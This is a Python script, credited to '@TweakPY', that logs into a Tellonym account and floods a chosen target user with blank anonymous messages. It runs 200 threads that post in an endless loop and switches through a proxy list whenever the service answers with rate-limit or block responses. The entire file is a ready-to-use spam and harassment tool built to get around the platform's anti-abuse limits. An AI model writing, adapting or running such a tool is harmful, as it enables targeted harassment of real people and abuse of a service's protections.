from requests import get,post
from random import choice
import requests,threading,os
class Tellonym:
	def __init__(self,sisn):
		self.sisn=sisn
		self.dn = 0
		self.er = 0
		self.prx = 0
		self.proxylist = []
		try:self.proxy=open(input('[$] Enter name file (proxy) : '),'r').read().splitlines()
		except FileNotFoundError:exit(input('\n[-] The file name is incorrect !\n'))
		self.Check_Target()
	def SENT_TELLS(self):
		global ID
		while 1:
			for pro in self.proxy:
				self.proxylist.append(pro)
				run = str(choice(self.proxylist))
			try:
				PROXY = {
					"http": f"http://{run}",
					"https": f"http://{run}"}
				sent=post('https://api.tellonym.me/tells/create',headers={'Host': 'api.tellonym.me','Content-Type': 'application/json;charset=utf-8','User-Agent': 'Tellonym/930 CFNetwork/1240.0.4 Darwin/20.5.0','Connection': 'keep-alive','tellonym-client': 'ios:3.24.0:930:14:iPhone11,2','Accept': 'application/json','Accept-Language': 'ar','Authorization': 'Bearer '+self.sisn,
				'Content-Length': '114'},json={"senderStatus":0,"previousRouteName":"ScreenResult","contentType":"CUSTOM","tell":"ㅤㅤㅤㅤㅤㅤ","userId":ID,"limit":16},proxies=PROXY)
				if ( sent.status_code == 200 ):
					self.dn+=1
					print(f'\r[$] Tells: [{self.dn}] | Error: [{self.er}] | Proxy:[{self.prx}]\r',end="")
				elif ( sent.status_code == 429 ) :
					self.prx+=1
					print(f'\r[$] Tells: [{self.dn}] | Error: [{self.er}] | Proxy:[{self.prx}]\r',end="")
				elif ( sent.status_code == 403 ) :
					self.prx+=1
					print(f'\r[$] Tells: [{self.dn}] | Error: [{self.er}] | Proxy:[{self.prx}]\r',end="")
				elif ( sent.status_code == 503 ) :
					self.prx+=1
					print(f'\r[$] Tells: [{self.dn}] | Error: [{self.er}] | Proxy:[{self.prx}]\r',end="")
				else:
					print(sent)
			except KeyboardInterrupt:exit()
			except RuntimeError:pass
			except requests.exceptions.ChunkedEncodingError:
				self.prx+=1
				print(f'\r[$] Tells: [{self.dn}] | Error: [{self.er}] | Proxy:[{self.prx}]\r',end="")
			except requests.exceptions.ConnectionError:
				self.prx+=1
				print(f'\r[$] Tells: [{self.dn}] | Error: [{self.er}] | Proxy:[{self.prx}]\r',end="")
	def TRYS(self):
		global ID
		theards = []
		for i in range(200):
			th1 = threading.Thread(target=self.SENT_TELLS)
			th1.start()
			theards.append(th1)	
		for th2 in theards:
			th2.join()
	def Check_Target(self):
		global ID
		Tartget=input('[+] Enter username Target : ')
		GetId=get(f'https://api.tellonym.me/profiles/name/{Tartget}?limit=13',headers={
		'Host': 'api.tellonym.me',
		'Content-Type': 'application/json;charset=utf-8',
		'Origin': 'https://tellonym.me',
		'Tellonym-Client': 'web:3.24.7',
		'Accept': 'application/json',
		'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
		'Accept-Language': 'en',
		'Connection': 'keep-alive'})
		if ( 'id' in GetId.text):
			ID = GetId.json()['id']
			print('\t\t━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
			self.TRYS()
		else:
			print('Username Not Found , Try again ..')
			return self.Check_Target()
def Logins():
	username=input('[+] Enter Username : ')
	pess=input('[+] Enter Password : ')
	if pess and username !="":pass
	else:return Logins()
	login=post('https://api.tellonym.me/tokens/create',headers={'Host': 'api.tellonym.me','Content-Type': 'application/json;charset=utf-8','Connection': 'keep-alive','tellonym-client': 'ios:2.40.1','Accept': 'application/json','Accept-Language': 'ar','Content-Length': '148','User-Agent': 'Tellonym/327 CFNetwork/1240.0.4 Darwin/20.5.0'},json={"deviceName":"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Vers","deviceType":"web","lang":"en","email":username,"password":pess,"limit":13})
	if ('accessToken') in login.text:
		print('[$] successfully Login ')
		sisn = login.json()['accessToken']
		Tellonym(sisn)
	elif ('This feature has been removed. Sorry about that...')in login.text:
		input('The username or password is incorrect')
	elif ('Ratelimit reached. Slow down') in login.text:
		input('[-] Ratelimit reached. Slow down')
	else:
		print(login.text)
		print(login)
def main():
	B=int(input("""
1/k) [ Kali linux / Windows ]
2/p) [ iphone / android]
Enter your device type : """))
	if B==1:
		os.system('cls' if os.name == 'nt' else 'clear')
		print("""		
████████╗███████╗██╗     ██╗      ██████╗ ███╗   ██╗██╗   ██╗███╗   ███╗   ████████╗███████╗██╗     ██╗     ███████╗
╚══██╔══╝██╔════╝██║     ██║     ██╔═══██╗████╗  ██║╚██╗ ██╔╝████╗ ████║   ╚══██╔══╝██╔════╝██║     ██║     ██╔════╝
   ██║   █████╗  ██║     ██║     ██║   ██║██╔██╗ ██║ ╚████╔╝ ██╔████╔██║█████╗██║   █████╗  ██║     ██║     ███████╗
   ██║   ██╔══╝  ██║     ██║     ██║   ██║██║╚██╗██║  ╚██╔╝  ██║╚██╔╝██║╚════╝██║   ██╔══╝  ██║     ██║     ╚════██║
   ██║   ███████╗███████╗███████╗╚██████╔╝██║ ╚████║   ██║   ██║ ╚═╝ ██║      ██║   ███████╗███████╗███████╗███████║
   ╚═╝   ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝      ╚═╝   ╚══════╝╚══════╝╚══════╝╚══════╝                                                                                                                   
            By @TweakPY""");Logins()
	else:
		os.system('cls' if os.name == 'nt' else 'clear')
		print("""
╔╦╗┌─┐┬  ┬  ┌─┐┌┐┌┬ ┬┌┬┐  ╔╦╗┌─┐┬  ┬  ┌─┐
 ║ ├┤ │  │  │ ││││└┬┘│││───║ ├┤ │  │  └─┐
 ╩ └─┘┴─┘┴─┘└─┘┘└┘ ┴ ┴ ┴   ╩ └─┘┴─┘┴─┘└─┘
      By  @TweakPY
""");Logins()
main()





